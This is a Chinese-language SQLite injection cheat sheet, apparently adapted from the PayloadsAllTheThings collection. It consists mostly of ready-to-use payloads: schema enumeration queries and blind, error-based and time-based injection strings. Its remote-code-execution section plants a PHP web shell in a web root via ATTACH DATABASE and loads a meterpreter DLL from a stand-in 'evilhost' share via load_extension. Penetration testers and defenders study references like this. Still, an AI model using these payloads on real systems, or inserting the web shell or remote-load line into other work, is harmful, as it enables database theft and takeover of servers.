# SQLite Injection - SQLite注入攻击

[SEARCH_KEYWORDS]
漏洞类型: SQL Injection SQLite 数据库注入
攻击类型: Data Extraction Remote Code Execution File Write
关键词: SQLite sqlite_master sqlite_version load_extension ATTACH DATABASE
技术: Blind Error Based Time Based RCE Attach Database
工具: sqlmap sqlite_master pragma_table_info
函数: sqlite_version() load_extension() writefile() group_concat()

[CONTENT]

## SQLite注入概述

SQLite注入是一种安全漏洞，攻击者可在SQLite数据库执行的查询中注入恶意SQL代码。由于用户输入未正确清理，攻击者可操纵查询逻辑。

## SQLite注释

| 类型 | 示例 |
|------|------|
| 单行注释 | `--` |
| 多行注释 | `/**/` |

## 信息枚举

```sql
select sqlite_version();
```

## 字符串提取方法

### 提取数据库结构

```sql
SELECT sql FROM sqlite_schema
SELECT sql FROM sqlite_master        -- sqlite_version > 3.33.0
```

### 提取表名

```sql
SELECT tbl_name FROM sqlite_master WHERE type='table'
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

### 提取列名

```sql
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');
SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')
```

## Blind Based注入

### 表数量

```sql
AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table
```

### 表名长度

```sql
AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number
```

### 提取信息

```sql
AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')
```

### Order By盲注

```sql
CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END
```

## Error Based注入

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

## Time Based注入

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## 远程代码执行

### Attach Database方法

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

### Load_extension方法

默认禁用，需要启用：

```sql
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

## 文件操作

### 写入文件

```sql
SELECT writefile('/path/to/file', column_name) FROM table_name
```

### 读取文件

SQLite默认不支持文件I/O操作。

## 参考文档

原始来源: PayloadsAllTheThings/SQL Injection/SQLite Injection.md